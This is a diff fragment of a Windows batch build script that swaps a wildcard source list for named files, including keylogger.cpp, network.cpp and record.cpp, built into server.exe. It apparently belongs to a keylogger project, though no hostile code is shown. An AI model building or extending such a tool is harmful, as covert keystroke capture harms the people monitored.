@@ -5,7 +5,7 @@ REM Link with required Windows libraries
 REM ----------------------------
 
 set COMPILER=g++
-set SOURCES=server.cpp src\*.cpp
+set SOURCES=server.cpp src\keylogger.cpp src\network.cpp src\utils.cpp src\record.cpp src\system.cpp
 set OUTPUT=server.exe
 
 REM List of libraries to link
